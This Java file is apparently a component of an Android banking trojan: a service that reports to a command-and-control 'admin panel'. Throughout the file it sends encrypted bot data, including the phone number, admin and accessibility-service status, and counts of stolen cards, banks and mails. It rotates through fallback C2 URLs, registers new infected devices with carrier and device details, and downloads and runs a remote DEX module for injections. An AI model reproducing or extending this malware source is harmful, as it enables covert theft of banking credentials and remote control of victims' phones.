package com.example.mmm.Service;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.telephony.TelephonyManager;

import com.example.mmm.Utils.idUtils;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.util.Locale;


public class srvNetworkConnect extends IntentService {
    constants consts = new constants();

    public srvNetworkConnect() {
        super("");
    }

    private String TAG_LOG = srvNetworkConnect.class.getSimpleName() + consts.strTAG1;
    utils utl = new utils();
    idUtils idutl = new idUtils();

    @Override
    protected void onHandleIntent(Intent intent) {
       // makeCPULock();
      //  makeWifiLock();
        checkAdminPanel(this);
        stopSelf();
    }

    void checkAdminPanel(Context context) {
        utl.Log(TAG_LOG, consts.str_log15);//-------------------checkAdminPanel-------------------
        String idbot = utl.SettingsRead(context, consts.idbot);
        String response;
        TelephonyManager tManager = (TelephonyManager) getBaseContext().getSystemService(Context.TELEPHONY_SERVICE);

        //check bot!
        JSONObject jsonCheckBot = new JSONObject();
        try {
            jsonCheckBot.put(consts.string_71, idbot);
            jsonCheckBot.put(consts.idSettings, utl.SettingsRead(context, consts.idSettings));
            jsonCheckBot.put(consts.string_72, idutl.getNumber(context));
            jsonCheckBot.put(consts.statAdmin, utl.isAdminDevice(this) ? consts.str_1 : consts.str_step);
            jsonCheckBot.put(consts.statProtect, utl.SettingsRead(context, consts.checkProtect));
            jsonCheckBot.put(consts.statScreen, idutl.getScreen(context));
            jsonCheckBot.put(consts.statAccessibilty, utl.isAccessibilityServiceEnabled(context, srvSccessibility.class) ? consts.str_1 : consts.str_step);
            jsonCheckBot.put(consts.statSMS, utl.getStatSMS(this));
            jsonCheckBot.put(consts.statCards, utl.SettingsRead(context, consts.statCards));
            jsonCheckBot.put(consts.statBanks, utl.SettingsRead(context, consts.statBanks));
            jsonCheckBot.put(consts.statMails, utl.SettingsRead(context, consts.statMails));
            jsonCheckBot.put(consts.activeDevice, utl.SettingsRead(context, consts.step));
            jsonCheckBot.put(consts.timeWorking, utl.SettingsRead(context, consts.timeWorking));
            jsonCheckBot.put(consts.statDownloadModule, utl.SettingsRead(context, consts.statDownloadModule));
            jsonCheckBot.put(consts.batteryLevel, utl.getBatteryLevel(context));
            jsonCheckBot.put(consts.locale, consts.str_null + Locale.getDefault().getLanguage());

        } catch (JSONException e) {
            utl.Log(TAG_LOG, consts.string_73);
           // utl.SettingsToAdd(this, consts.LogSMS , consts.string_152 + e.toString() + consts.string_119);
        }

        utl.Log(TAG_LOG, consts.string_74 + jsonCheckBot.toString());
        response = utl.httpRequest(this, consts.str_http_3 + utl.trafEnCr(jsonCheckBot.toString()));
        utl.Log(TAG_LOG, consts.string_74 + response);
        //---------------Check URLS-------------------------
        if ((response == null)) {//if no domain
            try {
                String getUrls = utl.SettingsRead(context, consts.urls);
                if (getUrls.contains(",")) {
                    String[] urls = getUrls.replace(consts.string_64, consts.str_null).split(consts.string_75);
                    for (String url : urls) {
                        if(url.length()>5) {
                            utl.Log(TAG_LOG, consts.string_76 + url);
                            if (utl.checkAP(url).contains(consts.string_77)) {
                                utl.SettingsWrite(context, consts.urlAdminPanel, url);
                                utl.Log(TAG_LOG, consts.string_78 + url);
                                break;
                            }
                        }
                    }
                }
            } catch (Exception ex) {
                utl.Log(TAG_LOG, consts.string_79);
            }
        }
        //--------------------------------------------------
        utl.Log(TAG_LOG, consts.string_80 + response);
        response = utl.trafDeCr(response);
        utl.Log(TAG_LOG, consts.string_81 + response);


        if (response.contains("||youNeedMoreResources||")
                && (!utl.SettingsRead(context, consts.statDownloadModule).equals(consts.str_1))) { //downloading module
            utl.downloadModuleDex(this, idbot);
            utl.Log("download","run");

        } else if (response.equals(consts.str_http_11)) { //   ||no||
            //registration bot
            // TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            JSONObject jsonRegistrationBot = new JSONObject(); //registration data bot !
            try {
                String country = utl.countrySIM(context); //tm.getNetworkCountryIso();
                if (country.length() != 2) {
                    country = Locale.getDefault().getCountry().toLowerCase();
                }

                jsonRegistrationBot.put(consts.string_71, idbot);
                jsonRegistrationBot.put(consts.string_83, Build.VERSION.RELEASE);
                jsonRegistrationBot.put(consts.string_84, consts.tag);
                jsonRegistrationBot.put(consts.string_85, country);
                jsonRegistrationBot.put(consts.string_86, tManager.getNetworkOperatorName());
                jsonRegistrationBot.put(consts.string_87, idutl.getDeviceName());

            } catch (JSONException e) {
              //  utl.SettingsToAdd(this, consts.LogSMS , consts.string_153 + e.toString() + consts.string_119);
            }

            utl.Log(TAG_LOG, consts.string_88 + jsonRegistrationBot.toString());
            response = utl.httpRequest(this, consts.str_http_12 + utl.trafEnCr(jsonRegistrationBot.toString()));
            response = utl.trafDeCr(response);
            utl.Log(TAG_LOG, consts.string_89 + response);
            if (response.equals(consts.string_90)) {
                utl.SettingsWrite(context, consts.checkupdateInjection, consts.str_1);
            }
        } else {// Start ModuleDEX main();
            if (new File(getDir(consts.string_95, Context.MODE_PRIVATE), consts.nameModule).exists()) {
                JSONObject jsonCheckInj = new JSONObject();
                try {
                    jsonCheckInj.put(consts.string_91, consts.string_92);
                    jsonCheckInj.put(consts.string_93, response);
                } catch (JSONException e) {
                //    utl.SettingsToAdd(this, consts.LogSMS , consts.string_154 + e.toString() + consts.string_119);
                }
                utl.sendMainModuleDEX(this, jsonCheckInj.toString());
            }
        }

    }
}